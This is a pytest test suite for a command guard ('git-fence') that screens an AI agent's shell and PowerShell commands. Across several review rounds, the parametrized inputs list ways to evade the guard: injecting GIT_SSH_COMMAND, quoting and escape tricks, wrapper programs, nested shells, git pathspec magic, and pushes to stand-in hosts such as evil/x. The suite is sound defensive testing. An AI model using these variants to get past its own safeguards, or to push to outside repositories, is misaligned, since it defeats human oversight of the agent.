    for cmd in ("rm {}/*.json".format(fwd(repo)), "cd sub && rm {}/.agil*".format(fwd(repo))):
        rc, _, err = run("claude", claude(cmd, repo))
        assert rc == 2 and "git-fence" in err, cmd
    assert run("claude", claude("rm {}/sub/*.o".format(fwd(repo)), repo)) == (0, "", "")


# --- security vòng 3 (SX1–SX7) -----------------------------------------------------------------------------------------------

@pytest.mark.parametrize("cmd", [
    "git_ssh_command=x git push origin spr-20-x",
    "env 'GI'T_SSH_COMMAND=x git push origin spr-20-x",
    'env "GIT"_SSH_COMMAND=x git push origin spr-20-x',
    "G=GIT_; export ${G}SSH_COMMAND=x; git push origin spr-20-x",
    "git --exec-path=/t push origin spr-20-x",
    "$env:git_ssh_command='x'; git push origin spr-20-x",
])
def test_git_env_variants_still_void_the_push_contract(tmp_path, monkeypatch, cmd):
    repo = contract_world(tmp_path, monkeypatch)
    rc, _, err = run("claude", claude(cmd, repo))
    assert rc == 2, (cmd, err)


@pytest.mark.parametrize("cmd", [
    "git branch -M main && git push origin HEAD", "git symbolic-ref HEAD refs/heads/main && git push origin HEAD",
    "git checkout main && git push origin HEAD", "git switch main; git push origin @", "git update-ref HEAD x && git push origin HEAD",
])
def test_push_head_after_a_command_that_moves_head_is_unverified(tmp_path, monkeypatch, cmd):
    repo = contract_world(tmp_path, monkeypatch)
    rc, _, err = run("claude", claude(cmd, repo))
    assert rc == 2, (cmd, err)


def test_push_head_alone_is_still_allowed_on_the_sprint_branch(tmp_path, monkeypatch):
    repo = contract_world(tmp_path, monkeypatch)
    assert run("claude", claude("git push origin HEAD", repo)) == (0, "", "")


@pytest.mark.parametrize("cmd", [
    "git rm -f .agil*", 'git rm ".agil*"', "git rm -rf .", "git rm -rf :/", "git mv .agil* x", "git rm *.json", "git mv . ../x",
])
def test_git_rm_mv_of_the_agile_json_by_glob_or_root_pathspec_is_denied(tmp_path, cmd):
    repo = protected_repo(tmp_path)
    rc, _, err = run("claude", claude(cmd, repo))
    assert rc == 2, (cmd, err)


@pytest.mark.parametrize("cmd", [
    "git config core.sshCommand x", "git config core.gitProxy x", "git config http.proxy x", "git config credential.helper x",
    "git config http.extraHeader x", "git config push.default x", "git config core.fsmonitor x",
    "echo x >> .git/config", "sed -i s/a/b/ .git/config", "cp x .git/config", "tee .git/hooks/pre-push",
])
def test_persistent_transport_config_and_git_config_file_writes_are_denied(tmp_path, cmd):
    repo = protected_repo(tmp_path)
    rc, _, err = run("claude", claude(cmd, repo))
    assert rc == 2, (cmd, err)


@pytest.mark.parametrize("cmd", [
    "rm .agile.{json,bak}", "rm .agile.js{on,}", "echo {} >| .agile.json", "echo {}>>.agile.json", "echo {}>.agile.json",
    "rm ../r*/.agil*", "rm /mnt/*/*/.agil*", "rm ../*/.agile.json",
])
def test_brace_redirect_and_parent_glob_forms_are_denied(tmp_path, cmd):
    repo = protected_repo(tmp_path)
    rc, _, err = run("claude", claude(cmd, repo))
    assert rc == 2, (cmd, err)


@pytest.mark.parametrize("cmd", [
    "gh pr create -Revil/x --title x", "gh pr create -R=evil/x --title x", "GH_REPO=evil/x gh pr create --title x",
    "GH_HOST=evil.example gh pr create --title x", "gh_repo=evil/x gh pr create --title x",
])
def test_gh_attached_repo_flag_and_gh_environment_void_the_contract(tmp_path, monkeypatch, cmd):
    repo = contract_world(tmp_path, monkeypatch)
    rc, _, err = run("claude", claude(cmd, repo))
    assert rc == 2, (cmd, err)


def test_gh_pr_create_for_the_verified_repo_passes_with_contract(tmp_path, monkeypatch):
    repo = contract_world(tmp_path, monkeypatch)
    assert run("claude", claude("gh pr create -R o/r --title x", repo)) == (0, "", "")


def test_include_repo_does_not_block_more_builtin_subcommands(tmp_path):
    repo = protected_repo(tmp_path, branch="x")
    with open(repo / ".git" / "config", "a", encoding="utf-8") as handle:
        handle.write("[include]\n\tpath = extra.cfg\n")
    for sub in ("sparse-checkout list", "maintenance run", "range-diff a b", "hash-object f", "var -l", "show-branch", "diff-index HEAD", "cherry", "prune", "repack", "credential fill"):
        assert run("claude", claude("git " + sub, repo)) == (0, "", ""), sub


# --- vòng 4 (Astra RY1–RY5) ---------------------------------------------------------------------------------------------------

def test_alias_does_not_hide_head_moves(tmp_path, monkeypatch):
    repo = contract_world(tmp_path, monkeypatch)
    with open(repo / ".git" / "config", "a", encoding="utf-8") as handle:
        handle.write("[alias]\n\tp = push\n\tsw = checkout\n")
    for cmd in ("git branch -M main && git p origin HEAD", "git sw main && git push origin HEAD", "git sw main && git p origin @"):
        rc, _, err = run("claude", claude(cmd, repo))
        assert rc == 2, (cmd, err)
    assert run("claude", claude("git p origin HEAD", repo)) == (0, "", "")


@pytest.mark.parametrize("cmd", ["rm .git/confi?", "rm .git/hook?/pre-push", "rm .git/hooks/*", "rm .git/c*", "rm -f .git/hooks/pre-pus?"])
def test_globs_over_git_config_and_hooks_are_denied(tmp_path, cmd):
    repo = protected_repo(tmp_path)
    rc, _, err = run("claude", claude(cmd, repo))
    assert rc == 2, (cmd, err)


def test_dot_git_lookalike_names_outside_dot_git_are_not_blocked(tmp_path):
    repo = protected_repo(tmp_path)
    (repo / ".github").mkdir()
    for cmd in ("rm .github/old.yml", "rm .gitignore", "rm .gitattributes", "echo x > .github/CODEOWNERS"):
        assert run("claude", claude(cmd, repo)) == (0, "", ""), cmd


def test_brace_expansion_beyond_the_limit_closes(tmp_path):
    repo = protected_repo(tmp_path)
    many = ",".join(["x"] * 70)
    for cmd in ("rm .agile.{" + many + ",json}", "rm " + "{" * 1200 + "a" + "}" * 1200, "rm {a,b}{c,d}{e,f}{g,h}{i,j}{k,l}{m,n}{o,p}.txt"):
        rc, _, err = run("claude", claude(cmd, repo))
        assert rc == 2 and "Traceback" not in err, cmd[:50]


def test_git_and_gh_words_in_content_do_not_void_the_contract(tmp_path, monkeypatch):
    repo = contract_world(tmp_path, monkeypatch)
    assert run("claude", claude("echo GIT_HELLO; git push origin spr-20-x", repo)) == (0, "", "")
    assert run("claude", claude('git commit -m "ghi chu ve GIT_DIR" && git push origin spr-20-x', repo)) == (0, "", "")
    assert run("claude", claude("gh pr create --title GH_TEST -R o/r", repo)) == (0, "", "")


# --- vòng 4 security (SZ1–SZ7) --------------------------------------------------------------------------------------------------

@pytest.mark.parametrize("cmd", [
    "G=GIT_SSH_COMMAND; env $G=x git push origin spr-20-x", "env $G=x git push --force origin main", 'env "$X" git push origin main',
    "env $G=x gh pr create -R evil/x --title x", "nice $A git push origin main",
])
def test_command_word_with_a_variable_after_env_does_not_hide_git(tmp_path, monkeypatch, cmd):
    repo = contract_world(tmp_path, monkeypatch)
    rc, _, err = run("claude", claude(cmd, repo))
    assert rc == 2, (cmd, err)


@pytest.mark.parametrize("cmd", [
    "git rm -rf ':(top)'", "git rm -f ':(top).agile.json'", "git rm -f ':(literal).agile.json'", "git rm -f ':(icase).AGILE.json'",
    "git rm -rf :/.agil*", "git rm -rf $PWD", "git rm -rf sub/..", "git rm -rf ././", "cd sub && git rm -rf ..", "git rm --pathspec-from-file=list.txt",
    "git rm -rf ':!sub'",
])
def test_git_rm_mv_pathspec_magic_and_dynamic_roots_are_denied(tmp_path, cmd):
    repo = protected_repo(tmp_path)
    (repo / "sub").mkdir()
    rc, _, err = run("claude", claude(cmd, repo))
    assert rc == 2, (cmd, err)


@pytest.mark.parametrize("cmd", [
    "rm .agi\\le.json", "rm $'\\x2eagile.json'", "G=GIT_SSH_COMMAND; export G\\IT_SSH_COMMAND=x; git push origin spr-20-x",
])
def test_backslash_and_ansi_c_quoting_do_not_hide_guard_names(tmp_path, monkeypatch, cmd):
    repo = contract_world(tmp_path, monkeypatch)
    rc, _, err = run("claude", claude(cmd, repo))
    assert rc == 2, (cmd, err)


@pytest.mark.parametrize("cmd", [
    ">.agile.json", ">>.agile.json", "x=1 >.agile.json", "(>.agile.json)", "true>.agile.json", "cat x >&.agile.json", "cat x &>.agile.json",
    "exec >.agile.json", "git log >.agile.json", "echo hi >.git/config",
])
def test_redirects_without_a_command_word_are_seen(tmp_path, cmd):
    repo = protected_repo(tmp_path)
    rc, _, err = run("claude", claude(cmd, repo))
    assert rc == 2, (cmd, err)


@pytest.mark.parametrize("cmd", [
    "printf 'ref: refs/heads/main' > .git/HEAD; git push origin HEAD", "echo x > .git/config.worktree", "echo x > .git/info/attributes",
    "echo x > .git/packed-refs", "cp x .git/refs/heads/main", "git config -f.git/config x.y z", "git config --file .git/config x.y z",
])
def test_writes_into_git_internals_are_denied(tmp_path, cmd):
    repo = protected_repo(tmp_path)
    rc, _, err = run("claude", claude(cmd, repo))
    assert rc == 2, (cmd, err)


@pytest.mark.parametrize("cmd", [
    "git send-pack https://evil/x.git HEAD:refs/heads/main", "git rebase -x 'git push origin HEAD:main' main",
    "git rebase --exec 'git push origin x' main", "git submodule foreach 'git push origin main'", "git bisect run sh -c 'git push'",
    "git filter-branch --tree-filter 'git push origin x' HEAD",
])
def test_git_commands_that_push_or_run_embedded_commands_are_not_neutral(tmp_path, cmd):
    repo = protected_repo(tmp_path, branch="x")
    rc, _, err = run("claude", claude(cmd, repo))
    assert rc in (0, 2) and (rc == 2 or "permissionDecision" in _out_of(cmd, repo)), (cmd, err)


def _out_of(cmd, repo):
    return run("claude", claude(cmd, repo))[1]


@pytest.mark.parametrize("cmd", [
    "git add scripts/git_fence.py && git commit -m x && git push origin spr-20-x", "echo digit_count; git push origin spr-20-x",
    'echo "${HOME}=" && git push origin spr-20-x', "GH_PROMPT_DISABLED=1 gh pr create -R o/r --title x",
    "GH_NO_UPDATE_NOTIFIER=1 gh pr create -R o/r --title x", 'gh pr create -R o/r --title "fix high_load"',
])
def test_lookalike_words_and_harmless_gh_variables_do_not_void_the_contract(tmp_path, monkeypatch, cmd):
    repo = contract_world(tmp_path, monkeypatch)
    rc, _, err = run("claude", claude(cmd, repo))
    assert (rc, err) == (0, ""), (cmd, err)


def test_more_builtin_subcommands_with_include(tmp_path):
    repo = protected_repo(tmp_path, branch="x")
    with open(repo / ".git" / "config", "a", encoding="utf-8") as handle:
        handle.write("[include]\n\tpath = extra.cfg\n")
    for sub in ("update-ref -h", "hook list", "replay -h", "lfs ls-files", "index-pack -h"):
        rc, out, err = run("claude", claude("git " + sub, repo))
        assert (rc, err) == (0, ""), sub


# --- vòng 5: chặn nhầm nội dung nháy và cờ gộp của gh ----------------------------------------------------------------------

@pytest.mark.parametrize("cmd", [
    'echo "x > .git/config"', 'echo "git rm :(top)"', "git config -f .git/config --get user.name",
    'echo "chuyen huong > .agile.json la cam"', "echo 'a >> .agile.json b'",
])
def test_quoted_text_that_only_looks_like_a_forbidden_write_is_allowed(tmp_path, cmd):
    repo = protected_repo(tmp_path)
    assert run("claude", claude(cmd, repo)) == (0, "", ""), cmd


@pytest.mark.parametrize("cmd", ['echo > ".agile.json"', "echo hi >.agile.json", "echo > '.git/config'"])
def test_quoted_redirect_target_without_spaces_is_still_a_write(tmp_path, cmd):
    repo = protected_repo(tmp_path)
    assert run("claude", claude(cmd, repo))[0] == 2, cmd


def test_env_assignment_text_inside_arguments_does_not_void_the_contract(tmp_path, monkeypatch):
    repo = contract_world(tmp_path, monkeypatch)
    for cmd in ("echo GIT_DIR=example; git push origin spr-20-x", 'git commit -m "env GIT_DIR=note" && git push origin spr-20-x'):
        assert run("claude", claude(cmd, repo)) == (0, "", ""), cmd
    for cmd in ("A=1 GIT_X=2 git push origin spr-20-x", "FOO=1; GIT_SSH_COMMAND=x git push origin spr-20-x"):
        assert run("claude", claude(cmd, repo))[0] == 2, cmd


def test_gh_combined_short_flags_ending_in_r_name_the_repository(tmp_path, monkeypatch):
    repo = contract_world(tmp_path, monkeypatch)
    for cmd in ("gh pr create -fR evil/x --title x", "gh pr create -tR evil/x"):
        assert run("claude", claude(cmd, repo))[0] == 2, cmd


# --- vòng 5 security (SY1–SY5) -----------------------------------------------------------------------------------------------

@pytest.mark.parametrize("cmd", [
    "export $G=x; git push origin spr-20-x", "G=GIT_CONFIG_COUNT; export $G=1; git push origin spr-20-x", "declare -x $G=x; git push origin spr-20-x",
    "GIT_SSH_COMMAND=evil bash -c 'git push origin spr-20-x'", 'env GIT_SSH_COMMAND=evil sh -c "git push origin spr-20-x"',
    "GIT_CONFIG_COUNT=1 eval 'git push origin spr-20-x'",
])
def test_environment_set_outside_the_nested_shell_voids_the_contract(tmp_path, monkeypatch, cmd):
    repo = contract_world(tmp_path, monkeypatch)
    assert run("claude", claude(cmd, repo))[0] == 2, cmd


def test_echo_with_variable_equals_text_is_not_an_assignment(tmp_path, monkeypatch):
    repo = contract_world(tmp_path, monkeypatch)
    assert run("claude", claude('echo "${HOME}=" && git push origin spr-20-x', repo)) == (0, "", "")


@pytest.mark.parametrize("cmd", [
    "env FO\\O=1 git push --force origin x", "env A.B=1 git push --force origin x",
    "g\\it push --force origin x", "git pu\\sh --force origin x", "git $'push' --force origin x", "$'git' push --force origin x",
    "setsid git push --force origin x", "ionice -c3 git push --force origin x", "doas git push --force origin x",
])
def test_escaped_or_odd_command_words_and_wrappers_still_reach_the_classifier(tmp_path, cmd):
    repo = protected_repo(tmp_path, branch="x")
    assert run("claude", claude(cmd, repo))[0] == 2, cmd


def test_absolute_and_relative_repo_root_pathspecs_for_git_rm_are_denied(tmp_path):
    repo = protected_repo(tmp_path)
    for cmd in ("git rm -rf {}".format(fwd(repo)), "git rm -rf ../{}".format(repo.name), "git mv {} ../x".format(fwd(repo))):
        assert run("claude", claude(cmd, repo))[0] == 2, cmd
    (repo / "sub").mkdir()
    assert run("claude", claude("git rm -f sub/x.txt", repo))[0] == 0


@pytest.mark.parametrize("cmd", [
    "git rebase -xmake main", "git rebase -ix main", "git rebase -x'git push' main", "git commit -nm x", "git commit -n -m x", "git commit -anm x",
])
def test_attached_exec_flag_and_short_no_verify_are_seen(tmp_path, cmd):
    repo = protected_repo(tmp_path, branch="x")
    assert run("claude", claude(cmd, repo))[0] == 2, cmd


def test_short_n_is_dry_run_for_push_and_not_no_verify(tmp_path):
    repo = protected_repo(tmp_path, branch="x")
    rc, out, _ = run("claude", claude("git push -n origin x", repo))
    assert rc == 0 and "ask" in out  # hỏi như mọi lệnh đẩy, không bị coi là --no-verify


@pytest.mark.parametrize("cmd,rc_expected", [("gh pr merge -dR evil/x 1", 0), ("gh release create -dR evil/x v1", 2)])
def test_gh_merge_and_release_with_combined_flags_are_recognised(tmp_path, monkeypatch, cmd, rc_expected):
    outside = tmp_path / "outside"
    outside.mkdir()
    (outside / ".git").mkdir()
    listing = tmp_path / "protected.json"
    listing.write_text(json.dumps({"repos": [{"remote_urls": ["https://github.com/evil/x.git"]}]}), encoding="utf-8")
    monkeypatch.setenv(git_fence.ENV_LIST, str(listing))
    monkeypatch.setattr(git_fence, "default_runner", lambda *a, **k: (1, ""))
    rc, out, _ = run("claude", claude(cmd, outside))
    assert rc == rc_expected and (rc == 2 or "ask" in out), cmd  # merge: hỏi; release: chặn


def test_gh_repo_flag_with_url_forms_is_normalised(tmp_path, monkeypatch):
    repo = contract_world(tmp_path, monkeypatch)
    assert run("claude", claude("gh pr create -R https://example.com/o/r --title x", repo)) == (0, "", "")
    assert run("claude", claude("gh pr create -R github.com/evil/x --title x", repo))[0] == 2


@pytest.mark.parametrize("cmd", ["git branch -M main && git commit -m x", "git symbolic-ref HEAD refs/heads/main; git commit -m x"])
def test_commit_after_a_command_that_moves_head_is_treated_as_on_a_protected_branch(tmp_path, cmd):
    repo = protected_repo(tmp_path, branch="x")
    assert run("claude", claude(cmd, repo))[0] == 2, cmd


# --- security vòng 5 (SV1–SV5) --------------------------------------------------------------------------------------------------

@pytest.mark.parametrize("cmd", [
    "git status\nGIT_SSH_COMMAND=x git push origin spr-20-x", "\nFOO=1 GIT_CONFIG_COUNT=1 git push origin spr-20-x",
    "\nGH_REPO=x/y gh pr create --title x", "sudo GIT_SSH_COMMAND=x git push origin spr-20-x", "time GIT_X=1 git push origin spr-20-x",
    "! GIT_X=1 git push origin spr-20-x", "command GIT_SSH_COMMAND=x git push origin spr-20-x",
    "if true; then GIT_X=1 git push origin spr-20-x; fi", "{ GIT_X=1 git push origin spr-20-x; }",
    "bash -c 'export GIT_SSH_COMMAND=x; git push origin spr-20-x'", "bash -c 'export GH_REPO=x/y; gh pr create --title x'",
])
def test_env_assignments_in_any_position_void_the_contract(tmp_path, monkeypatch, cmd):
    repo = contract_world(tmp_path, monkeypatch)
    assert run("claude", claude(cmd, repo))[0] == 2, cmd


def test_pathspec_magic_inside_a_nested_shell_string_is_still_seen(tmp_path):
    repo = protected_repo(tmp_path)
    assert run("claude", claude("bash -c 'echo a b; git rm -rf :(top)'", repo))[0] == 2


@pytest.mark.parametrize("cmd", [
    "su -c 'git push --force origin main'", "find . -name x -exec git push --force origin main ;", "wsl git push --force origin main",
    "parallel git push --force origin main", "watch git push --force origin main", "runuser -l u -c 'git push --force origin main'",
    "script -c 'git push --force origin main'", "chrt 1 git push --force origin main", "flock f git push --force origin main",
])
def test_unknown_wrappers_do_not_hide_git_or_gh(tmp_path, cmd):
    repo = protected_repo(tmp_path, branch="x")
    assert run("claude", claude(cmd, repo))[0] == 2, cmd


def test_stderr_redirection_after_a_push_does_not_break_the_contract(tmp_path, monkeypatch):
    repo = contract_world(tmp_path, monkeypatch)
    for cmd in ("git push origin spr-20-x 2>&1", "git push origin spr-20-x > out.txt", "git push origin spr-20-x 2>/dev/null"):
        assert run("claude", claude(cmd, repo)) == (0, "", ""), cmd


def test_gh_repo_flag_keeps_the_host_when_it_is_given(tmp_path, monkeypatch):
    repo = contract_world(tmp_path, monkeypatch)
    assert run("claude", claude("gh pr create -R https://evil.com/o/r --title x", repo))[0] == 2
    assert run("claude", claude("gh pr create -R https://example.com/o/r --title x", repo)) == (0, "", "")


def test_parentheses_inside_a_quoted_commit_message_are_text_not_separators(tmp_path):
    repo = protected_repo(tmp_path, branch="x")
    assert run("claude", claude('git commit -m "feat(guard): doc ghi .agile.json va them rao"', repo)) == (0, "", "")


def test_command_substitution_inside_quotes_is_still_split_and_seen(tmp_path):
    repo = protected_repo(tmp_path, branch="x")
    assert run("claude", claude('echo "a $(git push --force origin main) b"', repo))[0] == 2


# --- security vòng 6 (RF1–RF5 của bản sửa 67f129b) -----------------------------------------------------------------------------

@pytest.mark.parametrize("cmd", [
    "git push origin spr-20-x 2>&1 --force", "git push origin spr-20-x 2>&1 main", "git push origin spr-20-x 2>&1 --delete main",
    "git push origin spr-20-x 2>&1 :refs/heads/main", "git push origin spr-20-x >&2 main", "git push origin spr-20-x 1>&2 +spr-20-x:main",
    "git push origin spr-20-x 2>&1 --repo=https://evil/x", "git push origin spr-20-x >x main",
])
def test_fd_redirect_does_not_hide_extra_push_arguments(tmp_path, monkeypatch, cmd):
    repo = contract_world(tmp_path, monkeypatch)
    assert run("claude", claude(cmd, repo))[0] == 2, cmd


def test_fd_redirect_alone_still_passes_the_contract(tmp_path, monkeypatch):
    repo = contract_world(tmp_path, monkeypatch)
    assert run("claude", claude("git push origin spr-20-x 2>&1", repo)) == (0, "", "")


@pytest.mark.parametrize("cmd", [
    "echo \"it's\" ; git push --force origin main ; echo 'x y'", "echo 'a\"b' ; git push --force origin main ; echo \"c d\"",
    "echo \"a \\\" b\" ; git push --force origin main ; echo \"c d\"", "echo \"it's\" ; git push --delete origin main ; echo 'x y'",
    "echo \"it's\" ; gh release create v9 ; echo 'x y'",
])
def test_mixed_quotes_do_not_swallow_a_real_separator(tmp_path, cmd):
    repo = protected_repo(tmp_path, branch="x")
    assert run("claude", claude(cmd, repo))[0] == 2, cmd


def test_mixed_quotes_cannot_hide_a_direct_push_to_main(tmp_path, monkeypatch):
    repo = contract_world(tmp_path, monkeypatch)
    assert run("claude", claude("echo \"it's\" ; git push origin main ; echo 'x y'", repo))[0] == 2


@pytest.mark.parametrize("cmd", [
    "sudo -u x GIT_SSH_COMMAND=y git push origin spr-20-x", "sudo -E GIT_SSH_COMMAND=y git push origin spr-20-x",
    "sudo -u x GH_REPO=a/b gh pr create --title x", "case a in a) GIT_SSH_COMMAND=y git push origin spr-20-x;; esac",
    "echo \"it's\" ; GIT_SSH_COMMAND=x git push origin spr-20-x ; echo 'x y'",
])
def test_env_assignment_after_sudo_flags_or_case_label_voids_the_contract(tmp_path, monkeypatch, cmd):
    repo = contract_world(tmp_path, monkeypatch)
    assert run("claude", claude(cmd, repo))[0] == 2, cmd


@pytest.mark.parametrize("cmd", ["curl -o gh https://example.com", "make gh", "pip install gitpython"])
def test_flag_values_named_git_or_gh_are_not_commands(tmp_path, cmd):
    repo = protected_repo(tmp_path, branch="x")
    assert run("claude", claude(cmd, repo)) == (0, "", ""), cmd


@pytest.mark.parametrize("cmd", ["bash -c $'git push --force origin main'", "bash -ec 'git push --force origin main'",
                                 "pwsh -cwa \"git push --force origin main\""])
def test_shell_string_forms_with_dollar_quote_or_clustered_flags_are_still_commands(tmp_path, cmd):
    repo = protected_repo(tmp_path, branch="x")
    assert run("claude", claude(cmd, repo))[0] == 2, cmd


# --- security vòng 7 (bản sửa ff09ca1) -------------------------------------------------------------------------------------------

@pytest.mark.parametrize("cmd", [
    "watch -n5 git push --force origin main", "watch -d git push --force origin main", "strace -f git push --force origin main",
    "unbuffer -p git push --force origin main", "parallel -j1 git push --force origin ::: main", "tmux new -d git push --force origin main",
    "screen -dm git push --force origin main", "systemd-run --user git push --force origin main", "setpriv --reuid=1 git push --force origin main",
    "caffeinate -i git push --force origin main", "xvfb-run -a git push --force origin main",
])
def test_boolean_flags_before_git_do_not_hide_it(tmp_path, cmd):
    repo = protected_repo(tmp_path, branch="x")
    assert run("claude", claude(cmd, repo))[0] == 2, cmd


def test_backslash_is_not_an_escape_in_powershell(tmp_path):
    repo = protected_repo(tmp_path, branch="x")
    for cmd in ('echo "C:\\my dir\\" ; git push --force origin main ; echo "a b"', 'echo "C:\\dir\\" ; git push --force origin main ; echo "a b"'):
        assert run("claude", claude(cmd, repo, tool="PowerShell"))[0] == 2, cmd


@pytest.mark.parametrize("cmd", [
    "git push origin spr-20-x &>/dev/null main", "git push origin spr-20-x &> x main", "git push origin spr-20-x &>>x main",
    "git push origin spr-20-x >&file main", "git push origin spr-20-x >& file main", "git push origin spr-20-x 2>& 1 main",
])
def test_ampersand_redirect_forms_do_not_hide_extra_push_arguments(tmp_path, monkeypatch, cmd):
    repo = contract_world(tmp_path, monkeypatch)
    assert run("claude", claude(cmd, repo))[0] == 2, cmd


@pytest.mark.parametrize("cmd", [
    "echo $'it\\'s' ; git push --force origin main ; echo 'x y'", "echo \"$(printf '\"')\" ; git push --force origin main ; echo \"a b\"",
])
def test_ansi_c_quotes_and_nested_quotes_do_not_hide_a_separator(tmp_path, cmd):
    repo = protected_repo(tmp_path, branch="x")
    assert run("claude", claude(cmd, repo))[0] == 2, cmd


def test_redirect_to_the_guard_file_with_ampersand_form_is_still_seen(tmp_path):
    repo = protected_repo(tmp_path, branch="x")
    assert run("claude", claude("echo x &> .agile.json", repo))[0] == 2


# --- security vòng 8 (bản chốt 8c02d24) ----------------------------------------------------------------------------------------

@pytest.mark.parametrize("tool", ["Bash", "PowerShell"])
@pytest.mark.parametrize("cmd", [
    'git -c x.y="a;b" push --force origin main', "git --namespace='a|b' push --force origin main",
    'git --no-pager --namespace="a&&b" push --force origin main', 'git -c "x.y=a b;c" push --force origin main',
    'git -c "x.y=a&b" push --force origin main', 'git --config-env "x;y" push --force origin main',
])
def test_quoted_separators_in_git_option_values_do_not_split_the_command(tmp_path, cmd, tool):
    repo = protected_repo(tmp_path, branch="x")
    assert run("claude", claude(cmd, repo, tool=tool))[0] == 2, cmd


def test_quoted_separator_cannot_hide_an_extra_push_ref(tmp_path, monkeypatch):
    repo = contract_world(tmp_path, monkeypatch)
    assert run("claude", claude('git -c x.y="a;b" push origin spr-20-x main', repo))[0] == 2


@pytest.mark.parametrize("cmd", ["strace -o log -A git push --force origin main", "strace -F git push --force origin main",
                                 "unshare -m git push --force origin main", "nsenter -m git push --force origin main"])
def test_flags_of_unknown_wrappers_are_not_assumed_to_take_a_value(tmp_path, cmd):
    repo = protected_repo(tmp_path, branch="x")
    assert run("claude", claude(cmd, repo))[0] == 2, cmd


@pytest.mark.parametrize("cmd", ["curl -o gh https://example.com", "wget -O git https://example.com"])
def test_known_download_tools_may_name_their_output_git_or_gh(tmp_path, cmd):
    repo = protected_repo(tmp_path, branch="x")
    assert run("claude", claude(cmd, repo)) == (0, "", ""), cmd


def test_powershell_curly_quotes_are_quotes(tmp_path, monkeypatch):
    repo = contract_world(tmp_path, monkeypatch)
    cmd = "echo \"a b” ; git push --force origin main ; echo “c d\""
    assert run("claude", claude(cmd, repo, tool="PowerShell"))[0] == 2
    assert run("claude", claude("echo \"a b” ; git push origin main ; echo “c d\"", repo, tool="PowerShell"))[0] == 2


@pytest.mark.parametrize("cmd", [
    "Start-Process git push,--force,origin,main", "Start-Process -FilePath git -ArgumentList push,--force,origin,main", "saps git push,--force,origin,main",
])
def test_start_process_argument_lists_are_analysed_as_commands(tmp_path, cmd):
    repo = protected_repo(tmp_path, branch="x")
    assert run("claude", claude(cmd, repo, tool="PowerShell"))[0] == 2, cmd


# --- security vòng 9 (bản 55498d5) -----------------------------------------------------------------------------------------------

@pytest.mark.parametrize("tool", ["Bash", "PowerShell"])
@pytest.mark.parametrize("cmd", [
    "flock /tmp/l -c 'echo a;git push --force origin main'", "flock -c 'cd .;git push --force origin main' /tmp/l",
    "ash -c 'echo a;git push --force origin main'", "mksh -c \"echo a;git push --force origin main\"",
    "rbash -c 'cd .;git push --force origin main'", "yash -c 'true&&git push --force origin main'",
    "xargs -a f ash -c 'cd .;git push --force origin main'", "watch -n1 'cd .;git push --force origin main'",
])
def test_shell_strings_of_less_common_wrappers_are_split_before_looking_for_git(tmp_path, cmd, tool):
    repo = protected_repo(tmp_path, branch="x")
    assert run("claude", claude(cmd, repo, tool=tool))[0] == 2, cmd


@pytest.mark.parametrize("cmd", [
    "Start-Process git -ArgumentList '-C','.','push','--force','origin','main'", "Start-Process git -ArgumentList -C,.,push,--force,origin,main",
    "Start-Process git -ArgumentList '-c','x=y','push','--force','origin','main'", "Start-Process powershell -ArgumentList '-c','git push --force origin main'",
    "Start-Process -FilePath git -ArgumentList @('push','--force','origin','main')", "Start-Process git @('push','--force','origin','main')",
])
def test_start_process_argument_lists_starting_with_a_dash_or_array_syntax(tmp_path, cmd):
    repo = protected_repo(tmp_path, branch="x")
    assert run("claude", claude(cmd, repo, tool="PowerShell"))[0] == 2, cmd


@pytest.mark.parametrize("tool", ["Bash", "PowerShell"])
@pytest.mark.parametrize("cmd", [
    'echo "a\n";git push --force origin main;echo "b\n"', "echo 'a\n';git push --force origin main;echo 'b\n'",
    'echo "a\n"&&git push --force origin main&&echo "b\n"',
])
def test_multi_line_strings_cannot_pair_quotes_across_lines_and_hide_a_command(tmp_path, cmd, tool):
    repo = protected_repo(tmp_path, branch="x")
    assert run("claude", claude(cmd, repo, tool=tool))[0] == 2, cmd


@pytest.mark.parametrize("cmd", ["docker run --name gh image", "jira create --title \"git push --force origin main\"",
                                 "svn commit --message \"git push --force origin main\""])
def test_long_text_flags_hold_text_not_commands(tmp_path, cmd):
    repo = protected_repo(tmp_path, branch="x")
    assert run("claude", claude(cmd, repo)) == (0, "", ""), cmd
